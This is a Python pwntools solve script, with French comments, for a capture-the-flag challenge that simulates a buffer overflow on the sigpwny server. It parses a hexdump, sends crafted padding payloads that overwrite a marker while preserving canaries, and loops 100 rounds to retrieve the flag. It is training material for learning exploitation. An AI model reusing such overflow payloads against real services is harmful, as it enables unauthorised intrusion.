#!/usr/bin/env python3
# BOF Demigod — simulation de buffer overflow (serveur Python, pas de binaire).
#
# Le serveur affiche un hexdump de :  [\x00 * before][Beep][CHANGEME][Borp][\x00 * after]
# (before et after = 16 ou 32, tirés au hasard A CHAQUE TOUR).
# Notre entrée ECRASE le buffer depuis le debut : newbuf = resp + buf[len(resp):].
# Gagné si, apres ecrasement :  Beep intact, Borp intact, CHANGEME different.
#
# Strategie d'un tour :
#   payload = b"A"*before + b"Beep" + b"A"*8    (longueur = before + 12)
#   -> on reecrit Beep a l'identique, on remplace CHANGEME par "AAAAAAAA",
#      et on s'arrete AVANT Borp (before+12) pour le laisser intact via buf[len(resp):].
# Il faut 100 tours d'affilee pour decrocher le flag.

import re
from pwn import *

HOST, PORT = "chal.sigpwny.com", 3601
context.log_level = "info"

# --- parsing de l'hexdump -------------------------------------------------
# Chaque ligne du dump : "<offset 8 hex>: XXXX XXXX XXXX ..." (octets groupes par 2).
# On reconstruit les octets bruts, puis `before` = position de "Beep".
def parse_before(chunk: bytes) -> int:
    hexstr = ""
    for line in chunk.decode(errors="ignore").splitlines():
        m = re.match(r"^[0-9a-f]{8}: (.*)$", line)
        if m:
            hexstr += m.group(1).replace(" ", "")
    data = bytes.fromhex(hexstr)
    return data.index(b"Beep")   # nombre d'octets nuls avant Beep


def main():
    io = remote(HOST, PORT)
    for i in range(100):
        # tout ce qui precede "Input > " contient l'hexdump du tour courant
        chunk = io.recvuntil(b"Input > ")
        before = parse_before(chunk)
        assert before in (16, 32), f"before inattendu: {before}"

        payload = b"A" * before + b"Beep" + b"A" * 8   # len = before + 12
        io.sendline(payload)

        # confirmation du serveur ("Good Job keep going" si le tour est gagne)
        resp = io.recvline()
        log.info(f"[{i+1}/100] before={before} -> {resp.strip().decode(errors='ignore')}")
        if b"Good Job" not in resp:
            log.failure("Tour rate, le serveur a coupe.")
            log.info(io.recvall(timeout=2).decode(errors="ignore"))
            return

    # apres 100 reussites, le serveur lache le flag
    tail = io.recvall(timeout=3)
    m = re.search(rb"sigpwny\{[^}]*\}", tail)
    if m:
        log.success(f"FLAG: {m.group().decode()}")
    else:
        log.info(tail.decode(errors="ignore"))
    io.close()


if __name__ == "__main__":
    main()
